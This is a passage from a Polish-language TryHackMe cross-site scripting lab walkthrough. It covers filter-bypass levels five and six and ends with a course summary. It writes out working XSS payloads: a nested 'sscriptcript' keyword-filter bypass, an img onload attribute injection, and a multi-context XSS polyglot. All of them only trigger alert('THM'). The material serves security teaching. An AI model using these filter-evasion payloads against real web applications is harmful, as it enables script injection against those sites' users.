Teraz po kliknięciu przycisku **Enter** pojawi się okno z ostrzeżeniem zawierające ciąg znaków „THM”, a następnie komunikat potwierdzający, że ładunek został pomyślnie przesłany, a także link do następnego poziomu.

## Poziom piąty

Ten poziom wygląda tak samo jak pierwszy, a Twoje imię i nazwisko również wyświetla się w tym samym miejscu. Ale jeśli spróbujesz użyć tego `<script>alert('THM');</script>`ładunku, to nie zadziała. Kiedy przejrzysz kod źródłowy strony, zobaczysz dlaczego.

![Opcja inner.HTML poziomu piątego przed atakiem XSS.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/9bd2142b2bcd4b4cba34e571550294e4.png)

Słowo `script`  zostaje usunięte z Twojego ładunku, ponieważ istnieje filtr, który odrzuca słowa potencjalnie niebezpieczne.

Gdy z ciągu znaków zostanie usunięte jakieś słowo, możesz wypróbować następującą pomocną sztuczkę.

**Oryginalny ładunek**

```shell-session
<sscriptcript>alert('THM');</sscriptcript>
```

**Tekst do usunięcia (przez filtr)**

```shell-session
<sscriptcript>alert('THM');</sscriptcript>
```

**Ostateczny ładunek (po przejściu przez filtr)**

```shell-session
<script>alert('THM');</script>
```

Spróbuj wprowadzić ładunek `<sscriptcript>alert('THM');</sscriptcript>`i kliknij przycisk Enter, pojawi się okno z alertem zawierającym ciąg znakówTHM, a następnie otrzymasz komunikat potwierdzający, że ładunek został pomyślnie przesłany, a także link do następnego poziomu.

## Poziom szósty

Podobnie jak w Poziomie Drugim, gdzie musieliśmy uciec od atrybutu wartości znacznika wejściowego, możemy spróbować użyć `"><script>alert('THM');</script>`, ale to nie działa. Sprawdźmy kod źródłowy strony, aby dowiedzieć się, dlaczego to nie działa.

![Opcja inner.HTML poziomu szóstego po ataku XSS.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/8856b113fd514db704157837a6e6aeb4.png)

Jak widać, znaki `<`i `>`są odfiltrowywane z naszego ładunku, uniemożliwiając nam ucieczkę z `img`tagu. Aby obejść filtr, możemy wykorzystać dodatkowe atrybuty tagu `img`, takie jak zdarzenie onload. Zdarzenie onload wykonuje wybrany kod po załadowaniu obrazu określonego w atrybucie src na stronie.

Zmieńmy nasz ładunek tak, aby to odzwierciedlał `/images/cat.jpg" onload="alert('THM');`, a następnie wyświetlmy kod źródłowy strony, aby zobaczyć, jak to zadziała.

![Opcja inner.HTML poziomu szóstego po ataku XSS.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/3260719921aba8ad6eb8d887094fcb87.png)

Teraz po kliknięciu przycisku **Enter** pojawi się okno z ostrzeżeniem zawierające ciąg znaków „THMNastępnie otrzymasz komunikat potwierdzający, że Twój ładunek został pomyślnie wysłany. Na tym ostatnim poziomie otrzymasz flagę, którą możesz wprowadzić poniżej.

## Poligloci

Poliglota XSS to ciąg tekstu, który może jednocześnie omijać atrybuty i tagi oraz filtry. Mógłbyś użyć poniższego poligloty na wszystkich sześciu ukończonych poziomach, a kod zostałby wykonany pomyślnie.

```shell-session
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e'''

![Flaga końcowa po ukończeniu pokoju.](https://tryhackme-images.s3.amazonaws.com/user-uploads/691e303c8bb7e99b93a58132/room-content/691e303c8bb7e99b93a58132-1775465712309.png)

W tym pomieszczeniu zgłębialiśmy podstawowe koncepcje i praktyczne techniki, które się za nimi kryją.**XSS**, jednej z najczęstszych i najniebezpieczniejszych luk w nowoczesnych aplikacjach internetowych. Zaczęliśmy od zbudowania solidnych podstaw, wprowadzając kluczowe koncepcje, takie jak wykonywanie kodu JavaScript w przeglądarce, model obiektów dokumentu (DOM), pliki cookie i parametry adresu URL. Zrozumienie tych elementów jest ważne, ponieważXSSAtaki opierają się na sposobie, w jaki przeglądarki interpretują i wykonują kod po stronie klienta.  

Następnie przeszliśmy przez różne rodzajeXSSkrok po kroku. Zaczynając od **Reflected**XSSZaobserwowaliśmy, jak złośliwe dane wejściowe osadzone w adresie URL mogą być natychmiast odzwierciedlone przez aplikację i wykonane w przeglądarce ofiary. Następnie zbadaliśmy funkcję **Stored**XSS, gdzie dane wejściowe kontrolowane przez atakującego są zapisywane na serwerze, na przykład w komentarzach lub profilach użytkowników, a następnie uruchamiane za każdym razem, gdy inni użytkownicy przeglądają te treści. Zbadaliśmy również **model oparty na DOM .**XSS, który występuje wyłącznie po stronie klienta, gdy JavaScript nieprawidłowo przetwarza kontrolowane przez użytkownika dane w DOM, umożliwiając atakującym wstrzykiwanie i wykonywanie skryptów bez bezpośredniego udziału serwera.

Na koniec przyjrzeliśmy się **Blind**XSS, potężna odmiana, w której atakujący może nie zobaczyć natychmiastowego rezultatu działania swojego ładunku. Zamiast tego, złośliwy skrypt uruchamia się później w przeglądarce innego użytkownika, często administratora przeglądającego logi, zgłoszenia do pomocy technicznej lub panele moderacyjne. To pokazuje, jakXSSmogą zostać wykorzystane nawet wtedy, gdy atakujący nie mają bezpośredniej widoczności podatnego interfejsu.

Pod koniec tej podróży nie tylko zdobędziesz praktyczną wiedzę na temat tego, jakXSSLuki w zabezpieczeniach nie tylko działają, ale także rozwijają sposób myślenia testera penetracyjnego, który uczy się identyfikować słabe punkty w obsłudze danych wejściowych, tworzyć skuteczne ładunki i brać pod uwagę rzeczywisty wpływ tych luk.
